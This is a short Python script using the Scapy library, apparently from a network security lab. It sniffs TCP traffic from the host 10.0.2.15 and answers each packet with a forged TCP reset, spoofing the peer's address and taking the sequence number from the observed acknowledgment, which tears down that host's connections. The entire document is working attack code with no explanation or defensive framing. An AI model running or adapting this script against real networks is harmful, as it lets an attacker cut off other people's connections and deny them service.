#!/usr/bin/python3
from scapy.all import *

def spoof_tcp(pkt):
   IPLayer  = IP(dst="10.0.2.15", src=pkt[IP].dst)
   TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
                  dport=pkt[TCP].sport, sport=pkt[TCP].dport)

   spoofpkt = IPLayer/TCPLayer

   send(spoofpkt, verbose=0)

pkt=sniff(filter='tcp and src host 10.0.2.15', prn=spoof_tcp)
